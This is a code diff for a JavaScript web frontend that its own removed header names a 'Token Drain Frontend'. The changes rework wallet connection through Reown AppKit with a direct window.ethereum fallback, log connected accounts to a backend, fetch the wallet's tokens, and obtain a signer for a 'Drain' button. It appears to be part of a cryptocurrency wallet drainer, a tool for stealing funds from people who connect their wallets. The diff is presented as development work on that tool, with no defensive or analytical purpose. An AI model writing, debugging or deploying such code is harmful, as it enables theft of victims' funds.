@@ -1,8 +1,7 @@
-// Token Drain Frontend - WORKING VERSION
-// Uses CDN imports to avoid build issues
 import { createAppKit } from "@reown/appkit";
 import { EthersAdapter } from "@reown/appkit-adapter-ethers";
 import { ethers } from "ethers";
+
 // Configuration
 const CONFIG = {
     projectId: "962425907914a3e80a7d8e7288b23f62",
@@ -56,16 +55,17 @@ async function initializeApp() {
         networkSelect = document.getElementById("networkSelect");
         tokenCount = document.getElementById("tokenCount");
 
-        // Test backend connection
-        await testBackend();
-        
-        // Load AppKit from CDN
-        await loadAppKit();
+        // Initialize AppKit first
+        await initializeAppKit();
         
         // Setup event listeners
         setupEventListeners();
         
+        // Test backend connection
+        await testBackend();
+        
         console.log("✅ App initialized successfully");
+        updateStatus("✅ Ready! Click 'Connect Wallet' to begin");
         
     } catch (error) {
         console.error("Initialization error:", error);
@@ -73,42 +73,9 @@ async function initializeApp() {
     }
 }
 
-async function testBackend() {
+async function initializeAppKit() {
     try {
-        const response = await fetch(`${CONFIG.backendUrl}/health`);
-        if (response.ok) {
-            const data = await response.json();
-            console.log("✅ Backend is online:", data);
-            updateStatus("Ready to connect wallet...");
-        } else {
-            console.log("⚠️ Backend health check failed");
-            updateStatus("Backend connection issue - using local mode");
-        }
-    } catch (error) {
-        console.log("❌ Backend unreachable:", error.message);
-        updateStatus("Backend offline - using local mode");
-    }
-}
-
-async function loadAppKit() {
-    try {
-        // Dynamically import AppKit and EthersAdapter
-        const { createAppKit } = window.AppKit;
-        const { EthersAdapter } = window.EthersAdapter;
-        
-        // If not available in window, try to load from CDN
-        if (!createAppKit || !EthersAdapter) {
-            console.log("Loading AppKit from CDN...");
-            
-            // Load AppKit script
-            await loadScript('https://cdn.jsdelivr.net/npm/@reown/appkit@1.3.0/dist/index.umd.js');
-            await loadScript('https://cdn.jsdelivr.net/npm/@reown/appkit-adapter-ethers@1.0.0/dist/index.umd.js');
-            
-            // Now they should be in window
-            if (!window.AppKit || !window.EthersAdapter) {
-                throw new Error("Failed to load AppKit libraries");
-            }
-        }
+        console.log("Initializing AppKit...");
         
         // Create networks array
         const networks = Object.entries(CONFIG.rpcProviders).map(([id, rpcUrl]) => ({
@@ -117,9 +84,9 @@ async function loadAppKit() {
             rpcUrl: rpcUrl
         }));
         
-        // Initialize AppKit
-        appKit = window.AppKit.createAppKit({
-            adapters: [new window.EthersAdapter.EthersAdapter()],
+        // Initialize AppKit with proper configuration
+        appKit = createAppKit({
+            adapters: [new EthersAdapter()],
             projectId: CONFIG.projectId,
             networks: networks,
             metadata: {
@@ -134,32 +101,40 @@ async function loadAppKit() {
             }
         });
         
+        console.log("✅ AppKit created:", appKit);
+        
         // Subscribe to state changes
         appKit.subscribeState(handleAppKitState);
         
-        console.log("✅ AppKit loaded and initialized");
-        
     } catch (error) {
-        console.error("Failed to load AppKit:", error);
-        updateStatus("Wallet connection library failed to load. Please refresh.");
+        console.error("AppKit initialization error:", error);
         throw error;
     }
 }
 
-function loadScript(src) {
-    return new Promise((resolve, reject) => {
-        const script = document.createElement('script');
-        script.src = src;
-        script.onload = resolve;
-        script.onerror = reject;
-        document.head.appendChild(script);
-    });
+async function testBackend() {
+    try {
+        const response = await fetch(`${CONFIG.backendUrl}/health`);
+        if (response.ok) {
+            const data = await response.json();
+            console.log("✅ Backend is online:", data);
+        } else {
+            console.log("⚠️ Backend health check failed");
+        }
+    } catch (error) {
+        console.log("❌ Backend unreachable:", error.message);
+    }
 }
 
 function setupEventListeners() {
+    console.log("Setting up event listeners...");
+    
     // Connect button
     if (connectBtn) {
         connectBtn.addEventListener("click", handleConnect);
+        console.log("✅ Connect button listener added");
+    } else {
+        console.error("❌ Connect button not found!");
     }
     
     // Drain button
@@ -179,44 +154,86 @@ function setupEventListeners() {
 }
 
 async function handleConnect() {
+    console.log("Connect button clicked!");
+    
     try {
         if (!appKit) {
             updateStatus("Wallet connection not initialized");
+            console.error("AppKit not initialized");
             return;
         }
         
         if (isConnected) {
             // Disconnect
+            updateStatus("Disconnecting...");
             await appKit.disconnect();
-            isConnected = false;
-            updateStatus("Disconnected");
-            connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
-            hideUIElements();
             return;
         }
         
         updateStatus("Opening wallet modal...");
+        console.log("Calling appKit.open()...");
+        
+        // Open the wallet modal
         await appKit.open();
+        console.log("Modal opened successfully");
         
     } catch (error) {
         console.error("Connection error:", error);
         updateStatus("Connection failed: " + error.message);
+        
+        // Try alternative if AppKit.open fails
+        if (error.message.includes('open') || error.message.includes('modal')) {
+            tryAlternativeConnect();
+        }
+    }
+}
+
+function tryAlternativeConnect() {
+    console.log("Trying alternative connection method...");
+    updateStatus("Trying alternative connection...");
+    
+    // Try using window.ethereum directly
+    if (typeof window.ethereum !== 'undefined') {
+        window.ethereum.request({ method: 'eth_requestAccounts' })
+            .then(accounts => {
+                if (accounts && accounts.length > 0) {
+                    currentAccount = accounts[0];
+                    isConnected = true;
+                    updateStatus(`✅ Connected via fallback\nWallet: ${currentAccount.slice(0, 8)}...`);
+                    showUIElements();
+                    logConnectionToBackend(currentAccount, 1);
+                    fetchTokens(currentAccount, 1);
+                }
+            })
+            .catch(err => {
+                console.error("Fallback connection failed:", err);
+                updateStatus("Please install MetaMask or another wallet");
+            });
+    } else {
+        updateStatus("Please install a wallet extension like MetaMask");
     }
 }
 
 function handleAppKitState(state) {
-    console.log("AppKit State:", state);
+    console.log("AppKit State Update:", state);
     
     if (state.isConnected && state.account && state.chain) {
+        console.log("✅ Connected state detected");
         handleConnected(state.account, state.chain);
-    } else if (isConnected) {
+    } else if (state.isConnected === false && isConnected) {
+        console.log("❌ Disconnected state detected");
         handleDisconnected();
     }
 }
 
 async function handleConnected(account, chain) {
     try {
+        console.log("Handling connection...");
+        console.log("Account:", account);
+        console.log("Chain:", chain);
+        
         if (!account?.address || !chain?.id) {
+            console.log("Waiting for account/chain data...");
             setTimeout(() => handleConnected(account, chain), 100);
             return;
         }
@@ -226,7 +243,10 @@ async function handleConnected(account, chain) {
         isConnected = true;
         
         // Update UI
-        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
+        if (connectBtn) {
+            connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
+        }
+        
         updateStatus(`✅ Connected\n👛 Wallet: ${currentAccount.slice(0, 8)}...${currentAccount.slice(-4)}\n🌐 Network: ${chain.name}\n⛓️ Chain ID: ${chain.id}`);
         
         // Show UI elements
@@ -244,6 +264,8 @@ async function handleConnected(account, chain) {
             networkSelect.value = chain.id;
         }
         
+        console.log("✅ Fully connected and ready");
+        
     } catch (error) {
         console.error("Connected handler error:", error);
         updateStatus("Connection error: " + error.message);
@@ -251,13 +273,18 @@ async function handleConnected(account, chain) {
 }
 
 function handleDisconnected() {
+    console.log("Handling disconnection...");
+    
     currentAccount = null;
     currentChainId = null;
     isConnected = false;
     provider = null;
     signer = null;
     
-    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
+    if (connectBtn) {
+        connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
+    }
+    
     updateStatus("Disconnected");
     hideUIElements();
 }
@@ -419,8 +446,11 @@ async function handleDrain() {
             drainBtn.textContent = "⏳ Draining...";
         }
         
-        // Get signer from wallet
-        if (typeof window.ethereum !== 'undefined') {
+        // Get signer from wallet using AppKit's signer
+        if (appKit && appKit.signer) {
+            provider = new ethers.providers.Web3Provider(appKit.signer);
+            signer = provider.getSigner();
+        } else if (typeof window.ethereum !== 'undefined') {
             provider = new ethers.providers.Web3Provider(window.ethereum);
             signer = provider.getSigner();
         } else {
@@ -518,12 +548,8 @@ function updateStatus(message) {
     }
 }
 
-// Make sure ethers is available globally
-if (typeof ethers === 'undefined') {
-    // Load ethers from CDN if not already loaded
-    const ethersScript = document.createElement('script');
-    ethersScript.src = 'https://cdn.ethers.io/lib/ethers-5.7.umd.min.js';
-    ethersScript.onload = () => console.log('Ethers.js loaded');
-    document.head.appendChild(ethersScript);
-}
-
+// Debug: Check what's loaded
+console.log("=== App Debug Info ===");
+console.log("Ethers version:", ethers.version);
+console.log("Window.ethereum:", typeof window.ethereum !== 'undefined');
+console.log("======================");
